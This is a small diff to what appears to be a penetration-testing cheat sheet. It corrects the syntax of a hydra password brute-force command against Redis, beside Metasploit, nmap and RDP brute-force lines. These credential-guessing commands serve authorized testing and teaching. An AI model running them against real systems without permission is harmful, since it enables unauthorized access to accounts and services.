@@ -286,7 +286,7 @@ hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
 ```bash
 msf> use auxiliary/scanner/redis/redis_login
 nmap --script redis-brute -p 6379 <IP>
-hydra –P /path/pass.txt <IP> redis
+hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
 ```
 
 ### Rexec
